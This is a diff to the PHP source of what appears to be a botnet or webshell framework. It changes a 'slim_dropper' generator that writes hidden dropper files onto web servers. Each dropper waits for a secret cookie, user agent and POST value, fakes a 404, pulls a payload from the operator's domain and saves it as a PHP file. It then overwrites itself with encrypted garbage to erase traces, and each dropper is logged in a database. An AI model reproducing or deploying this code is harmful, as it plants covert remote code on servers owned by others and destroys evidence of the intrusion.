@@ -3,24 +3,25 @@ const alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
 const special  = '~!@#%^&*(){}[],./?';
 const disallowed = '1234567890';
 const allowed_chars = alpha;
+const all_chars = alpha.special.disallowed;
 
 class dynamic_generator
 {
     function slim_dropper(string $caller, string $filename, bool $randomize){
         if ($randomize === true && !empty($caller)){
-            if (!is_file($filename)){
-                $filename .= substr(allowed_chars, 0, 10);
-                $cookieName = substr(allowed_chars, 0, 10);
-                $cookie_value = substr(allowed_chars, 0, 10);
-                $randomized_ua = substr(allowed_chars, 0, 10);
-                $post_variable = substr(allowed_chars, 0, 10);
-                $post_value = substr(allowed_chars, 0, 10);
+            if (empty($filename)){
+                $filename = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
+                $cookieName = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
+                $cookie_value = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
+                $randomized_ua = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
+                $post_variable = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
+                $post_value = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
                 $slim = file('includes/templates/base_template.php');
-                $slim[1] = <<<SLIMM
-if (\$_COOKIE['$cookieName'] === $cookie_value && \$_SERVER['HTTP_USER_AGENT'] === '$randomized_ua'){
+                $dr = <<<SLIMM
+if (\$_COOKIE['$cookieName'] === '$cookie_value' && \$_SERVER['HTTP_USER_AGENT'] === '$randomized_ua'){
     if (isset(\$_POST['$post_variable']) && \$_POST['$post_variable'] === '$post_value'){
         http_response_code(404);
-        fputs(fopen('./$filename', 'a+'),file_get_contents("$caller?r=pull"));
+        fputs(fopen('./$filename.php', 'a+'),file_get_contents("$caller?r=pull"));
         foreach (file(\$_SERVER['SCRIPT_FILENAME']) as \$line){
             fwrite(fopen(\$_SERVER['SCRIPT_FILENAME'], 'w'), openssl_encrypt(\$line, 'aes-256-ctr', bin2hex(openssl_random_pseudo_bytes(100)), OPENSSL_RAW_DATA|OPENSSL_NO_PADDING|OPENSSL_ZERO_PADDING, openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-ctr'))));
         }
@@ -33,16 +34,20 @@ if (\$_COOKIE['$cookieName'] === $cookie_value && \$_SERVER['HTTP_USER_AGENT'] =
     die();
 }
 SLIMM;
-                $to_out = 'includes/droppers/dynamic/slim'.substr(allowed_chars, 0, 10).'.php';
-                fwrite(fopen($to_out, 'a+'), $slim);
-                pg_exec(pg_connect(DBCONN), sprintf("INSERT INTO sloppy_bots_slim_droppers(location_on_disk, checkindomain, cookiename, cookievalue, user_agent) VALUES ('%s', '%s', '%s', '%s', '%s')",
-                        $to_out,
+                $push_out = 'includes/droppers/dynamic/slim/'.bin2hex(openssl_random_pseudo_bytes(15)).'.php';
+                $to_out = fopen($push_out, 'a+');
+                fwrite($to_out, (string)$slim[0]);
+                fwrite($to_out, $dr);
+                fclose($to_out);
+                pg_exec(pg_connect(DBCONN), sprintf("INSERT INTO sloppy_bots_slim_droppers(location_on_disk, caller_domain, cookiename, cookievalue, user_agent) VALUES ('%s', '%s', '%s', '%s', '%s')",
+                        $push_out,
                         $caller,
                         $cookieName,
                         $cookie_value,
                         $randomized_ua
                     )
                 );
+                return true;
             }
         }else{
             return false;
